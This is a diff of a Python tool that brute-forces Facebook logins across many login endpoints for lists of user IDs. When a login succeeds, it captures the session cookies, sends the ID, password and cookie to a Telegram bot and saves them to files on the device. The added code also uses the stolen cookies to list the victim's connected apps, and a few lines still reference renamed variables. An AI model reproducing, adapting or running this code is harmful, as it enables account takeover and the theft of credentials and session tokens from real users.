@@ -1,12 +1,25 @@
 import os
 import uuid,base64,hashlib,zlib,subprocess,time,platform,pycurl
 import bs4,json,sys,time,random,re,subprocess,platform,struct,string,uuid,base64,zlib
+import _socket, ssl, certifi
 from bs4 import BeautifulSoup
 from io import BytesIO
 from bs4 import BeautifulSoup as sop
-import _socket, ssl, certifi
 from concurrent.futures import ThreadPoolExecutor as tred
 from concurrent.futures import ThreadPoolExecutor as ThreadPool 
+from rich.table import Table as me
+from rich.console import Console as sol
+from bs4 import BeautifulSoup as sop
+from concurrent.futures import ThreadPoolExecutor as tred
+from rich.console import Group as gp
+from rich.panel import Panel as nel
+from rich.markdown import Markdown as mark
+from rich.columns import Columns as col
+from rich import pretty
+from rich.text import Text as tekz
+from time import localtime as lt
+pretty.install()
+CON=sol()
 os.system("pip install licensing > /dev/null")
 from licensing.models import *
 from licensing.methods import Key, Helpers
@@ -107,6 +120,16 @@ oks = []
 cps = []
 id = []
 ck = []
+ugen2=[]
+ugen=[]
+cokbrut=[]
+ses=requests.Session()
+princp=[]
+id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
+cokbrut=[]
+pwpluss,pwnya=[],[]
+cooki = []
+cpxx = []
 import time
 from datetime import datetime
 sasi = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December']
@@ -556,16 +579,17 @@ def m1(ids,pwv):
             session.post('https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348028',data=info,headers=update).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies or 'm_page_voice' in log_cookies or 'xs' in log_cookies:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = re.findall('c_user=(.*);xs',coki)[0]
+                kuki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = re.findall('c_user=(.*);xs',kuki)[0]
                 ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
                 res = requests.get(ckk).text
                 if 'Photoshop' in res:
                         print(f'\r\r{rad}[{green}ZERO-OK{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
                         print(f"\r\r{green}COOKIES=[🤖]: {warna}{coki}\33[1;36m");linex()
-                        statusok = (f" {cid} | {pas} | {coki} ")
+                        cek_apk(kuki)
+                        statusok = (f" {cid} | {pas} | {kuki} ")
                         requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
-                        open('/sdcard/ZERO-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ZERO-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+coki+'\n')                        
+                        open('/sdcard/ZERO-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ZERO-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+kuki+'\n')                        
                         oks.append(cid)
                         break
             elif 'checkpoint' in log_cookies:
@@ -617,16 +641,17 @@ def m2(ids,pwv):
             session.post('https://m.alpha..facebook.com/login/?next=https%3A%2F%2Fmbasic.facebook.com%2Flogin%2Fsave-device%2Fcancel%2F&li=6iKEZhsVXhKGcXY8k5F-hD3f&e=1348029&shbl=1&refsrc=deprecated&_rdr',data=info,headers=update).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies or 'm_page_voice' in log_cookies or 'xs' in log_cookies:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = re.findall('c_user=(.*);xs',coki)[0]
+                kuki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = re.findall('c_user=(.*);xs',kuki)[0]
                 ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
                 res = requests.get(ckk).text
                 if 'Photoshop' in res:
                         print(f'\r\r{rad}[{green}ZERO-OK{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
-                        print(f"\r\r{green}COOKIES=[🤖]: {warna}{coki}\33[1;36m");linex()
+                        print(f"\r\r{green}COOKIES=[🤖]: {warna}{kuki}\33[1;36m");linex()
+                        cek_apk(kuki)
                         statusok = (f" {cid} | {pas} | {coki} ")
                         requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
-                        open('/sdcard/ZERO-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ZERO-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+coki+'\n')
+                        open('/sdcard/ZERO-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ZERO-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+kuki+'\n')
                         oks.append(cid)
                         break
             elif 'checkpoint' in log_cookies:
@@ -663,16 +688,17 @@ def m3(ids,pwv):
             session.post('https://m.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348028',data=info,headers=update).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies or 'm_page_voice' in log_cookies or 'xs' in log_cookies:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = re.findall('c_user=(.*);xs',coki)[0]
+                kuki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = re.findall('c_user=(.*);xs',kuki)[0]
                 ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
                 res = requests.get(ckk).text
                 if 'Photoshop' in res:
                         print(f'\r\r{rad}[{green}ZERO-OK{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
-                        print(f"\r\r{green}COOKIES=[🤖]: {warna}{coki}\33[1;36m");linex()
-                        statusok = (f" {cid} | {pas} | {coki} ")
+                        print(f"\r\r{green}COOKIES=[🤖]: {warna}{kuki}\33[1;36m");linex()
+                        cek_apk(kuki)
+                        statusok = (f" {cid} | {pas} | {kuki} ")
                         requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
-                        open('/sdcard/ZERO-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ZERO-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+coki+'\n')
+                        open('/sdcard/ZERO-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ZERO-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+kuki+'\n')
                         oks.append(cid)
                         break
             elif 'checkpoint' in log_cookies:
@@ -725,16 +751,17 @@ def m4(ids,pwv):
             session.post('https://bn-in.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100',data=info,headers=update).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies or 'm_page_voice' in log_cookies or 'xs' in log_cookies:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = re.findall('c_user=(.*);xs',coki)[0]
+                kuki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = re.findall('c_user=(.*);xs',kuki)[0]
                 ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
                 res = requests.get(ckk).text
                 if 'Photoshop' in res:
                         print(f'\r\r{rad}[{green}ZERO-OK{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
                         print(f"\r\r{green}COOKIES=[🤖]: {warna}{coki}\33[1;36m");linex()
-                        statusok = (f" {cid} | {pas} | {coki} ")
+                        cek_apk(kuki)
+                        statusok = (f" {cid} | {pas} | {kuki} ")
                         requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
-                        open('/sdcard/ZERO-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ZERO-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+coki+'\n')
+                        open('/sdcard/ZERO-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ZERO-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+kuki+'\n')
                         oks.append(cid)
                         break
             elif 'checkpoint' in log_cookies:
@@ -806,16 +833,17 @@ def m5(ids,pwv):
             url = 'htt'+'ps://g'+'raph.face'+'book.com/auth/login'
             q = requests.post(url,data=info,headers=update,allow_redirects=False,verify=True).json()
             if 'access_token' in q:
-                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");coki = f"sb={AJb};{ckkk}"
+                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");kuki = f"sb={AJb};{ckkk}"
                 cid = str(q['uid'])
                 ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
                 res = requests.get(ckk).text
                 if 'Photoshop' in res:
                         print(f'\r\r{rad}[{green}ZERO-OK{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
-                        print(f"\r\r{green}COOKIES=[🤖]: {warna}{coki}\33[1;36m");linex()
-                        statusok = (f" {cid} | {pas} | {coki} ")
+                        print(f"\r\r{green}COOKIES=[🤖]: {warna}{kuki}\33[1;36m");linex()
+                        cek_apk(kuki)
+                        statusok = (f" {cid} | {pas} | {kuki} ")
                         requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
-                        open('/sdcard/ZERO-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ZERO-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+coki+'\n')
+                        open('/sdcard/ZERO-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ZERO-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+kuki+'\n')
                         oks.append(cid)
                         break
             elif 'www.facebook.com' in q['error']['message']:
@@ -887,16 +915,17 @@ def m6(ids,pwv):
             url = 'htt'+'ps://a'+'pi.face'+'book.com/auth/login'
             q = requests.post(url,data=info,headers=update,allow_redirects=False,verify=True).json()
             if 'access_token' in q:
-                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");coki = f"sb={AJb};{ckkk}"
+                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");kuki = f"sb={AJb};{ckkk}"
                 cid = str(q['uid'])
                 ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
                 res = requests.get(ckk).text
                 if 'Photoshop' in res:
                         print(f'\r\r{rad}[{green}ZERO-OK{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
-                        print(f"\r\r{green}COOKIES=[🤖]: {warna}{coki}\33[1;36m");linex()
-                        statusok = (f" {cid} | {pas} | {coki} ")
+                        print(f"\r\r{green}COOKIES=[🤖]: {warna}{kuki}\33[1;36m");linex()
+                        cek_apk(kuki)
+                        statusok = (f" {cid} | {pas} | {kuki} ")
                         requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
-                        open('/sdcard/ZERO-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ZERO-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+coki+'\n')
+                        open('/sdcard/ZERO-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ZERO-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+kuki+'\n')
                         oks.append(cid)
                         break
             elif 'www.facebook.com' in q['error']['message']:
@@ -967,16 +996,17 @@ def m7(ids,pwv):
             url = 'htt'+'ps://a'+'pi.face'+'book.com/auth/login'
             q = requests.post(url,data=info,headers=update,allow_redirects=False,verify=True).json()
             if 'access_token' in q:
-                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");coki = f"sb={AJb};{ckkk}"
+                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");kuki = f"sb={AJb};{ckkk}"
                 cid = str(q['uid'])
                 ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
                 res = requests.get(ckk).text
                 if 'Photoshop' in res:
                         print(f'\r\r{rad}[{green}ZERO-OK{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
-                        print(f"\r\r{green}COOKIES=[🤖]: {warna}{coki}\33[1;36m");linex()
-                        statusok = (f" {cid} | {pas} | {coki} ")
+                        print(f"\r\r{green}COOKIES=[🤖]: {warna}{kuki}\33[1;36m");linex()
+                        cek_apk(kuki)
+                        statusok = (f" {cid} | {pas} | {kuki} ")
                         requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
-                        open('/sdcard/ZERO-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ZERO-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+coki+'\n')
+                        open('/sdcard/ZERO-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ZERO-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+kuki+'\n')
                         oks.append(cid)
                         break
             elif 'www.facebook.com' in q['error']['message']:
@@ -1046,16 +1076,17 @@ def m8(ids,pwv):
             url = 'htt'+'ps://b-'+'api.face'+'book.com/auth/login'
             q = requests.post(url,data=info,headers=update,allow_redirects=False,verify=True).json()
             if 'access_token' in q:
-                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");coki = f"sb={AJb};{ckkk}"
+                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");kuki = f"sb={AJb};{ckkk}"
                 cid = str(q['uid'])
                 ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
                 res = requests.get(ckk).text
                 if 'Photoshop' in res:
                         print(f'\r\r{rad}[{green}ZERO-OK{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
-                        print(f"\r\r{green}COOKIES=[🤖]: {warna}{coki}\33[1;36m");linex()
-                        statusok = (f" {cid} | {pas} | {coki} ")
+                        print(f"\r\r{green}COOKIES=[🤖]: {warna}{kuki}\33[1;36m");linex()
+                        cek_apk(kuki)
+                        statusok = (f" {cid} | {pas} | {kuki} ")
                         requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
-                        open('/sdcard/ZERO-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ZERO-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+coki+'\n')
+                        open('/sdcard/ZERO-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ZERO-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+kuki+'\n')
                         oks.append(cid)
                         break
             elif 'www.facebook.com' in q['error']['message']:
@@ -1176,13 +1207,14 @@ def __MTDONEE__(ids, names, passlist, total_ids):
             q = json.loads(po)
             if 'access_token' in q:
                 response_data = json.loads(po)
-                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={AJb};{ckkk}"
+                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");kuki = f"sb={AJb};{ckkk}"
                 print(f'\r\r{rad}[{green}zar0-OK{rad}]{green} {ids} {rad}: {green}{pas}')
-                print(f"\r\r{rad}[{green}COOKIES=[🤖]{rad}]: {warna}{cookie}")
+                print(f"\r\r{rad}[{green}COOKIES=[🤖]{rad}]: {warna}{kuki}")
+                cek_apk(kuki)
                 oks.append(ids)
-                statusok = (f" {ids} | {pas} | {cookie} ")
+                statusok = (f" {ids} | {pas} | {kuki} ")
                 requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
-                open('/sdcard/zar0-M1-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/zar0-M6-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
+                open('/sdcard/zar0-M1-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/zar0-M6-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
                 break
             elif "User must verify their account" in po:
                 cps.append(ids)
@@ -1274,13 +1306,14 @@ def __MTDTWOO__(ids, names, passlist, total_ids):
             q = json.loads(po)
             if 'access_token' in q:
                 response_data = json.loads(po)
-                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={AJb};{ckkk}"
+                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");kuki = f"sb={AJb};{ckkk}"
                 print(f'\r\r{rad}[{green}zar0-OK{rad}]{green} {ids} {rad}: {green}{pas}')
-                print(f"\r\r{rad}[{green}COOKIES=[🤖]{rad}]: {warna}{cookie}")
+                print(f"\r\r{rad}[{green}COOKIES=[🤖]{rad}]: {warna}{kuki}")
+                cek_apk(kuki)
                 oks.append(ids)
-                statusok = (f" {ids} | {pas} | {cookie} ")
+                statusok = (f" {ids} | {pas} | {kuki} ")
                 requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
-                open('/sdcard/zar0-M2-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/zar0-M6-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
+                open('/sdcard/zar0-M2-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/zar0-M6-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
                 break
             elif "User must verify their account" in po:
                 cps.append(ids)
@@ -1372,13 +1405,14 @@ def __MTDTHREE__(ids, names, passlist, total_ids):
             q = json.loads(po)
             if 'access_token' in q:
                 response_data = json.loads(po)
-                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={AJb};{ckkk}"
+                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");kuki = f"sb={AJb};{ckkk}"
                 print(f'\r\r{rad}[{green}zar0-OK{rad}]{green} {ids} {rad}: {green}{pas}')
                 print(f"\r\r{rad}[{green}COOKIES=[🤖]{rad}]: {warna}{cookie}")
+                cek_apk(kuki)
                 oks.append(ids)
-                statusok = (f" {ids} | {pas} | {cookie} ")
+                statusok = (f" {ids} | {pas} | {kuki} ")
                 requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
-                open('/sdcard/zar0-M3-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/zar0-M6-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
+                open('/sdcard/zar0-M3-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/zar0-M6-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
                 break
             elif "User must verify their account" in po:
                 cps.append(ids)
@@ -1470,13 +1504,14 @@ def __MTDFOUR__(ids, names, passlist, total_ids):
             q = json.loads(po)
             if 'access_token' in q:
                 response_data = json.loads(po)
-                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={AJb};{ckkk}"
+                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");kuki = f"sb={AJb};{ckkk}"
                 print(f'\r\r{rad}[{green}zar0-OK{rad}]{green} {ids} {rad}: {green}{pas}')
-                print(f"\r\r{rad}[{green}COOKIES=[🤖]{rad}]: {warna}{cookie}")
+                print(f"\r\r{rad}[{green}COOKIES=[🤖]{rad}]: {warna}{kuki}")
+                cek_apk(kuki)
                 oks.append(ids)
-                statusok = (f" {ids} | {pas} | {cookie} ")
+                statusok = (f" {ids} | {pas} | {kuki} ")
                 requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
-                open('/sdcard/zar0-M4-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/zar0-M6-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
+                open('/sdcard/zar0-M4-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/zar0-M6-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
                 break
             elif "User must verify their account" in po:
                 cps.append(ids)
@@ -1574,13 +1609,14 @@ def __MTDFIVE__(ids, names, passlist, total_ids):
             q = json.loads(po)
             if 'access_token' in q:
                 response_data = json.loads(po)
-                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={AJb};{ckkk}"
+                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");kuki = f"sb={AJb};{ckkk}"
                 print(f'\r\r{rad}[{green}zar0-OK{rad}]{green} {ids} {rad}: {green}{pas}')
-                print(f"\r\r{rad}[{green}COOKIES=[??]{rad}]: {warna}{cookie}")
+                print(f"\r\r{rad}[{green}COOKIES=[??]{rad}]: {warna}{kuki}")
+                cek_apk(kuki)
                 oks.append(ids)
-                statusok = (f" {ids} | {pas} | {cookie} ")
+                statusok = (f" {ids} | {pas} | {kuki} ")
                 requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
-                open('/sdcard/zar0-M6-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/zar0-M6-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
+                open('/sdcard/zar0-M6-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/zar0-M6-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
                 break
             elif "User must verify their account" in po:
                 cps.append(ids)
@@ -1638,18 +1674,19 @@ def __MTDSIX__(ids, names, passlist, total_ids):
             lo = session.post('https://m.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=data,headers=headers).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                kuki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
                 print(f'\r\r{rad}[{green}zar0-OK{rad}]{green} {cid} {rad}: {green}{pas}')
-                print(f"\r\r{rad}[{green}COOKIES=[🤖]{rad}]: {warna}{coki}")
+                print(f"\r\r{rad}[{green}COOKIES=[🤖]{rad}]: {warna}{kuki}")
+                cek_apk(kuki)
                 oks.append(cid)
-                statusok = (f" {cid} | {pas} | {coki} ")
+                statusok = (f" {cid} | {pas} | {kuki} ")
                 requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
-                open('/sdcard/zar0-M6-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/zar0-M6-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+coki+'\n')
+                open('/sdcard/zar0-M6-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/zar0-M6-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+kuki+'\n')
                 break
             elif "User must verify their account" in lo:
                 cps.append(ids)
-                #print(f'\r\r{rad}[zar0-CP]{rad} {ids} {rad}| {pas}')
+                print(f'\r\r{rad}[zar0-CP]{rad} {ids} {rad}| {pas}')
                 open('/sdcard/zar0-CP.txt', 'a').write(ids + '|' + pas + '\n')
                 break
             else:
@@ -1660,6 +1697,30 @@ def __MTDSIX__(ids, names, passlist, total_ids):
     except Exception as e:
         pass
 
+        pass	
+#----------------[ ID-CHECKER ]--------------------------#
+
+def cek_apk(kuki):
+	session = requests.Session()
+	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
+	sop = bs4.BeautifulSoup(w,"html.parser")
+	x = sop.find("form",method="post")
+	game = [i.text for i in x.find_all("h3")]
+	try:
+		for i in range(len(game)):
+			print ("\r%s  \033[0m➛ %s%s"%(P,H,game[i].replace("Added on"," Added on")))
+	except AttributeError:
+		print ("\r    %s\033[0m cookie invalid"%(M))
+	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
+	sop = bs4.BeautifulSoup(w,"html.parser")
+	x = sop.find("form",method="post")
+	game = [i.text for i in x.find_all("h3")]
+	try:
+		for i in range(len(game)):
+			print ("\r%s  \033[0m➛ %s"%(P,game[i].replace("Expired"," Expired")))
+	except AttributeError:
+		print ("\r    %s \033[0mcookie invalid"%(M))
+#-----------------------[ SYSTEM-CONTROL ]--------------------#
 os.system("clear")
 #Process()
 zar0()
